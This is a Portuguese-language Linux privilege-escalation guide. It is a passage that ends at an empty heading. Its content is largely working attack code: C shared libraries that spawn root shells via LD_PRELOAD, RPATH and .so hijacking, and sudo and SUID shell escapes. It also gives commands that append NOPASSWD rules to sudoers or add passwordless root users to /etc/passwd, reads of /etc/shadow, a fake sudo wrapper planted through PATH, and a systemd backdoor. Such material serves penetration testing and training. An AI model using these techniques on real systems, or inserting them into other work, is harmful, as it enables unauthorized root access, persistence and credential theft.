Verifique **quem** você é, quais **privilégios** você possui, quais **usuários** estão nos sistemas, quais podem **fazer login** e quais têm **privilégios de root:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Algumas versões do Linux foram afetadas por um bug que permite que usuários com **UID > INT\_MAX** escalarem privilégios. Mais informações: [aqui](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [aqui](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) e [aqui](https://twitter.com/paragonsec/status/1071152249529884674).\
**Explorá-lo** usando: **`systemd-run -t /bin/bash`**

### Grupos

Verifique se você é um **membro de algum grupo** que poderia conceder privilégios de root:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Área de transferência

Verifique se há algo interessante localizado dentro da área de transferência (se possível)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Política de Senhas
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Senhas conhecidas

Se você **conhece alguma senha** do ambiente, **tente fazer login como cada usuário** usando a senha.

### Su Brute

Se não se importar em fazer muito barulho e os binários `su` e `timeout` estiverem presentes no computador, você pode tentar forçar a entrada de usuário usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
O [**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) com o parâmetro `-a` também tenta forçar a entrada de usuários.

## Abusos de PATH graváveis

### $PATH

Se você descobrir que pode **escrever dentro de alguma pasta do $PATH**, pode ser capaz de elevar privilégios **criando uma porta dos fundos dentro da pasta gravável** com o nome de algum comando que será executado por um usuário diferente (idealmente root) e que **não é carregado de uma pasta localizada anteriormente** à sua pasta gravável no $PATH.

### SUDO e SUID

Você pode ter permissão para executar algum comando usando sudo ou eles podem ter o bit suid. Verifique usando:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Alguns **comandos inesperados permitem que você leia e/ou escreva arquivos ou até mesmo execute um comando.** Por exemplo:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

A configuração do Sudo pode permitir que um usuário execute algum comando com os privilégios de outro usuário sem precisar saber a senha.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Neste exemplo, o usuário `demo` pode executar o `vim` como `root`, agora é trivial obter um shell adicionando uma chave ssh no diretório root ou chamando `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Esta diretiva permite ao usuário **definir uma variável de ambiente** enquanto executa algo:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Este exemplo, **baseado na máquina HTB Admirer**, estava **vulnerável** ao **PYTHONPATH hijacking** para carregar uma biblioteca python arbitrária ao executar o script como root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Desvio de execução do Sudo passando por caminhos

**Pule** para ler outros arquivos ou use **links simbólicos**. Por exemplo, no arquivo sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Se um **curinga** é usado (\*), é ainda mais fácil:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contramedidas**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Comando Sudo/binário SUID sem caminho de comando

Se a **permissão sudo** for concedida a um único comando **sem especificar o caminho**: _hacker10 ALL= (root) less_, você pode explorá-lo alterando a variável PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Esta técnica também pode ser usada se um binário **suid** **executar outro comando sem especificar o caminho para ele (sempre verifique com** _**strings**_ **o conteúdo de um binário SUID estranho)**.

[Exemplos de payload para executar.](payloads-to-execute.md)

### Binário SUID com caminho do comando

Se o **binário suid** **executar outro comando especificando o caminho**, então, você pode tentar **exportar uma função** com o nome do comando que o arquivo suid está chamando.

Por exemplo, se um binário suid chama _**/usr/sbin/service apache2 start**_ você tem que tentar criar a função e exportá-la:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Então, quando você chama o binário suid, essa função será executada

### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

A variável de ambiente **LD_PRELOAD** é usada para especificar uma ou mais bibliotecas compartilhadas (.so files) a serem carregadas pelo carregador antes de todas as outras, incluindo a biblioteca C padrão (`libc.so`). Esse processo é conhecido como pré-carregamento de uma biblioteca.

No entanto, para manter a segurança do sistema e evitar que esse recurso seja explorado, especialmente com executáveis **suid/sgid**, o sistema impõe certas condições:

- O carregador ignora o **LD_PRELOAD** para executáveis onde o ID de usuário real (_ruid_) não corresponde ao ID de usuário efetivo (_euid_).
- Para executáveis com suid/sgid, apenas bibliotecas em caminhos padrão que também são suid/sgid são pré-carregadas.

A escalada de privilégios pode ocorrer se você tiver a capacidade de executar comandos com `sudo` e a saída de `sudo -l` incluir a declaração **env_keep+=LD_PRELOAD**. Essa configuração permite que a variável de ambiente **LD_PRELOAD** persista e seja reconhecida mesmo quando os comandos são executados com `sudo`, potencialmente levando à execução de código arbitrário com privilégios elevados.
```
Defaults        env_keep += LD_PRELOAD
```
Salve como **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Em seguida, **compile-o** usando:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Finalmente, **eleve os privilégios** executando
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
Uma privesc semelhante pode ser abusada se o atacante controlar a variável de ambiente **LD\_LIBRARY\_PATH** porque ele controla o caminho onde as bibliotecas serão pesquisadas.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### Binário SUID - injeção .so

Ao encontrar um binário com permissões **SUID** que parecem incomuns, é uma boa prática verificar se ele está carregando arquivos **.so** corretamente. Isso pode ser verificado executando o seguinte comando:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Por exemplo, encontrar um erro como _"open(“/caminho/para/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (Arquivo ou diretório não encontrado)"_ sugere um potencial para exploração.

Para explorar isso, alguém procederia criando um arquivo C, digamos _"/caminho/para/.config/libcalc.c"_, contendo o seguinte código:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Este código, uma vez compilado e executado, tem como objetivo elevar privilégios manipulando permissões de arquivos e executando um shell com privilégios elevados.

Compile o arquivo C acima em um arquivo de objeto compartilhado (.so) com:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Finalmente, executar o binário SUID afetado deve acionar o exploit, permitindo a possível comprometimento do sistema.


## Sequestro de Objeto Compartilhado
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Agora que encontramos um binário SUID carregando uma biblioteca de uma pasta onde podemos escrever, vamos criar a biblioteca nessa pasta com o nome necessário:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Se você receber um erro como
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
Isso significa que a biblioteca que você gerou precisa ter uma função chamada `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) é uma lista selecionada de binários Unix que podem ser explorados por um atacante para contornar restrições de segurança locais. [**GTFOArgs**](https://gtfoargs.github.io/) é o mesmo, mas para casos em que você só pode **injetar argumentos** em um comando.

O projeto coleta funções legítimas de binários Unix que podem ser abusadas para escapar de shells restritos, elevar ou manter privilégios elevados, transferir arquivos, gerar shells de ligação e reversos e facilitar outras tarefas pós-exploração.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Se você pode acessar `sudo -l`, você pode usar a ferramenta [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) para verificar se ela encontra como explorar alguma regra do sudo.

### Reutilizando Tokens do Sudo

Em casos em que você tem **acesso sudo** mas não a senha, você pode elevar privilégios **aguardando a execução de um comando sudo e depois sequestrando o token da sessão**.

Requisitos para elevar privilégios:

* Você já tem um shell como usuário "_sampleuser_"
* "_sampleuser_" usou `sudo` para executar algo nos **últimos 15 minutos** (por padrão, essa é a duração do token sudo que nos permite usar `sudo` sem precisar de senha)
* `cat /proc/sys/kernel/yama/ptrace_scope` é 0
* `gdb` é acessível (você pode ser capaz de fazer upload dele)

(Você pode temporariamente habilitar `ptrace_scope` com `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ou modificando permanentemente `/etc/sysctl.d/10-ptrace.conf` e definindo `kernel.yama.ptrace_scope = 0`)

Se todos esses requisitos forem atendidos, **você pode elevar privilégios usando:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* O **primeiro exploit** (`exploit.sh`) criará o binário `activate_sudo_token` em _/tmp_. Você pode usá-lo para **ativar o token sudo em sua sessão** (você não obterá automaticamente um shell root, faça `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* O **segundo exploit** (`exploit_v2.sh`) irá criar um shell sh em _/tmp_ **propriedade do root com setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* O **terceiro exploit** (`exploit_v3.sh`) irá **criar um arquivo sudoers** que torna os **tokens sudo eternos e permite que todos os usuários usem o sudo**.
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Nome de Usuário>

Se você tiver **permissões de escrita** na pasta ou em qualquer um dos arquivos criados dentro da pasta, você pode usar o binário [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) para **criar um token sudo para um usuário e PID**.\
Por exemplo, se você puder sobrescrever o arquivo _/var/run/sudo/ts/sampleuser_ e tiver um shell como esse usuário com PID 1234, você pode **obter privilégios sudo** sem precisar saber a senha fazendo:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

O arquivo `/etc/sudoers` e os arquivos dentro de `/etc/sudoers.d` configuram quem pode usar `sudo` e como. Esses arquivos **por padrão só podem ser lidos pelo usuário root e pelo grupo root**.\
**Se** você pode **ler** este arquivo, você pode ser capaz de **obter algumas informações interessantes**, e se você pode **escrever** em qualquer arquivo, você será capaz de **escalar privilégios**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Se você pode escrever, você pode abusar dessa permissão
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Outra maneira de abusar dessas permissões:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Existem algumas alternativas para o binário `sudo`, como o `doas` para OpenBSD, lembre-se de verificar sua configuração em `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sequestro de Sudo

Se você sabe que um **usuário normalmente se conecta a uma máquina e usa `sudo`** para elevar privilégios e você obteve um shell dentro desse contexto de usuário, você pode **criar um novo executável sudo** que executará seu código como root e, em seguida, o comando do usuário. Em seguida, **modifique o $PATH** do contexto do usuário (por exemplo, adicionando o novo caminho no .bash\_profile) para que, quando o usuário executar o sudo, seu executável sudo seja executado.

Observe que se o usuário estiver usando um shell diferente (não bash), você precisará modificar outros arquivos para adicionar o novo caminho. Por exemplo, o [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Você pode encontrar outro exemplo em [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)

Ou executando algo como:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteca Compartilhada

### ld.so

O arquivo `/etc/ld.so.conf` indica **de onde os arquivos de configuração carregados são provenientes**. Tipicamente, este arquivo contém o seguinte caminho: `include /etc/ld.so.conf.d/*.conf`

Isso significa que os arquivos de configuração de `/etc/ld.so.conf.d/*.conf` serão lidos. Esses arquivos de configuração **apontam para outras pastas** onde as **bibliotecas** serão **procuradas**. Por exemplo, o conteúdo de `/etc/ld.so.conf.d/libc.conf` é `/usr/local/lib`. **Isso significa que o sistema procurará bibliotecas dentro de `/usr/local/lib`**.

Se, por algum motivo, **um usuário tiver permissões de escrita** em algum dos caminhos indicados: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, qualquer arquivo dentro de `/etc/ld.so.conf.d/` ou qualquer pasta dentro do arquivo de configuração dentro de `/etc/ld.so.conf.d/*.conf`, ele pode ser capaz de escalar privilégios.\
Veja **como explorar essa má configuração** na página a seguir:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Ao copiar a biblioteca para `/var/tmp/flag15/`, ela será usada pelo programa neste local conforme especificado na variável `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Em seguida, crie uma biblioteca maliciosa em `/var/tmp` com `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacidades

As capacidades do Linux fornecem um **subconjunto dos privilégios de root disponíveis para um processo**. Isso efetivamente divide os **privilégios de root em unidades menores e distintas**. Cada uma dessas unidades pode então ser concedida independentemente a processos. Dessa forma, o conjunto completo de privilégios é reduzido, diminuindo os riscos de exploração.\
Leia a seguinte página para **saber mais sobre as capacidades e como abusar delas**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Permissões de diretório

Em um diretório, o **bit de "execução"** implica que o usuário afetado pode fazer "**cd**" para a pasta.\
O bit de **"leitura"** implica que o usuário pode **listar** os **arquivos**, e o bit de **"escrita"** implica que o usuário pode **excluir** e **criar** novos **arquivos**.

## ACLs

As Listas de Controle de Acesso (ACLs) representam a camada secundária de permissões discricionárias, capazes de **sobrescrever as permissões tradicionais ugo/rwx**. Essas permissões aprimoram o controle sobre o acesso a arquivos ou diretórios, permitindo ou negando direitos a usuários específicos que não são os proprietários ou parte do grupo. Esse nível de **granularidade garante um gerenciamento de acesso mais preciso**. Mais detalhes podem ser encontrados [**aqui**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dê** ao usuário "kali" permissões de leitura e escrita sobre um arquivo:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Obter** arquivos com ACLs específicas do sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Sessões de shell abertas

Em **versões antigas** você pode **sequestrar** alguma **sessão de shell** de um usuário diferente (**root**).\
Nas **versões mais recentes** você só poderá **conectar-se** a sessões de tela do **seu próprio usuário**. No entanto, você pode encontrar **informações interessantes dentro da sessão**.

### Sequestrando sessões de tela

**Listar sessões de tela**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
**Anexar a uma sessão**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Sequestro de sessões do tmux

Este era um problema com **versões antigas do tmux**. Não consegui sequestrar uma sessão do tmux (v2.1) criada pelo root como um usuário não privilegiado.

**Listar sessões do tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
**Anexar a uma sessão**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Verifique a **caixa Valentine do HTB** para um exemplo.

## SSH

### Debian OpenSSL PRNG Previsível - CVE-2008-0166

Todas as chaves SSL e SSH geradas em sistemas baseados em Debian (Ubuntu, Kubuntu, etc) entre setembro de 2006 e 13 de maio de 2008 podem ser afetadas por esse bug.\
Esse bug é causado ao criar uma nova chave ssh nesses sistemas operacionais, pois **apenas 32.768 variações eram possíveis**. Isso significa que todas as possibilidades podem ser calculadas e **tendo a chave pública ssh, você pode procurar pela chave privada correspondente**. Você pode encontrar as possibilidades calculadas aqui: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Valores de configuração interessantes do SSH

* **PasswordAuthentication:** Especifica se a autenticação por senha é permitida. O padrão é `no`.
* **PubkeyAuthentication:** Especifica se a autenticação por chave pública é permitida. O padrão é `yes`.
* **PermitEmptyPasswords**: Quando a autenticação por senha é permitida, especifica se o servidor permite o login em contas com strings de senha vazias. O padrão é `no`.

### PermitRootLogin

Especifica se o root pode fazer login usando ssh, o padrão é `no`. Valores possíveis:

* `yes`: root pode fazer login usando senha e chave privada
* `without-password` ou `prohibit-password`: root só pode fazer login com uma chave privada
* `forced-commands-only`: Root pode fazer login apenas usando chave privada e se as opções de comandos forem especificadas
* `no` : não

### AuthorizedKeysFile

Especifica os arquivos que contêm as chaves públicas que podem ser usadas para autenticação do usuário. Pode conter tokens como `%h`, que serão substituídos pelo diretório home. **Você pode indicar caminhos absolutos** (começando em `/`) ou **caminhos relativos a partir do diretório home do usuário**. Por exemplo:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Essa configuração indicará que se você tentar fazer login com a chave **privada** do usuário "**testusername**", o ssh irá comparar a chave pública da sua chave com as localizadas em `/home/testusername/.ssh/authorized_keys` e `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

O encaminhamento do agente SSH permite que você **use suas chaves SSH locais em vez de deixar chaves** (sem frases-passe!) **situadas em seu servidor**. Assim, você será capaz de **pular** via ssh **para um host** e a partir daí **pular para outro** host **usando** a **chave** localizada em seu **host inicial**.

Você precisa configurar essa opção em `$HOME/.ssh.config` assim:
```
Host example.com
ForwardAgent yes
```
Observe que se `Host` for `*`, toda vez que o usuário pular para uma máquina diferente, essa máquina poderá acessar as chaves (o que é um problema de segurança).

O arquivo `/etc/ssh_config` pode **sobrescrever** essas **opções** e permitir ou negar essa configuração.\
O arquivo `/etc/sshd_config` pode **permitir** ou **negar** o encaminhamento do ssh-agent com a palavra-chave `AllowAgentForwarding` (o padrão é permitir).

Se você descobrir que o Encaminhamento do Agente está configurado em um ambiente, leia a seguinte página, pois **você pode ser capaz de abusar disso para escalar privilégios**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## Arquivos Interessantes

### Arquivos de Perfil

O arquivo `/etc/profile` e os arquivos em `/etc/profile.d/` são **scripts que são executados quando um usuário inicia um novo shell**. Portanto, se você puder **escrever ou modificar qualquer um deles, poderá escalar privilégios**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Se algum script de perfil estranho for encontrado, você deve verificá-lo em busca de **detalhes sensíveis**.

### Arquivos Passwd/Shadow

Dependendo do sistema operacional, os arquivos `/etc/passwd` e `/etc/shadow` podem ter nomes diferentes ou pode haver um backup. Portanto, é recomendado **encontrar todos eles** e **verificar se você pode lê-los** para ver **se há hashes** dentro dos arquivos:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Em algumas ocasiões, você pode encontrar **hashes de senhas** dentro do arquivo `/etc/passwd` (ou equivalente)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd Gravável

Primeiro, gere uma senha com um dos seguintes comandos.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Em seguida, adicione o usuário `hacker` e insira a senha gerada.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Por exemplo: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Agora você pode usar o comando `su` com `hacker:hacker`

Alternativamente, você pode usar as seguintes linhas para adicionar um usuário fictício sem senha.\
AVISO: você pode degradar a segurança atual da máquina.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTA: Nas plataformas BSD, `/etc/passwd` está localizado em `/etc/pwd.db` e `/etc/master.passwd`, também o `/etc/shadow` é renomeado para `/etc/spwd.db`.

Você deve verificar se consegue **escrever em alguns arquivos sensíveis**. Por exemplo, você consegue escrever em algum **arquivo de configuração de serviço**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Por exemplo, se a máquina estiver executando um servidor **tomcat** e você puder **modificar o arquivo de configuração do serviço Tomcat dentro de /etc/systemd/**, então você pode modificar as linhas:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Seu backdoor será executado na próxima vez que o tomcat for iniciado.

### Verificar Pastas

As seguintes pastas podem conter backups ou informações interessantes: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Provavelmente você não conseguirá ler a última, mas tente)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Localização/Estranhos Arquivos de Propriedade
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Arquivos modificados nos últimos minutos
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Arquivos de banco de dados Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### Arquivos \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Arquivos ocultos
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Scripts/Binários no PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```
### **Arquivos da Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Cópias de Segurança**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Arquivos conhecidos que contêm senhas

Leia o código do [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), ele procura por **vários arquivos possíveis que poderiam conter senhas**.\
**Outra ferramenta interessante** que você pode usar para fazer isso é: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) que é um aplicativo de código aberto usado para recuperar muitas senhas armazenadas em um computador local para Windows, Linux e Mac.

### Logs

Se você puder ler logs, talvez consiga encontrar **informações interessantes/confidenciais dentro deles**. Quanto mais estranho o log, mais interessante ele será (provavelmente).\
Além disso, alguns logs de auditoria "**ruins**" configurados (com backdoor?) podem permitir que você **grave senhas** dentro dos logs de auditoria, conforme explicado neste post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Para **ler logs do grupo** [**adm**](grupos-interessantes-linux-pe/#grupo-adm) será realmente útil.

### Arquivos de shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Pesquisa Genérica de Credenciais/Regex

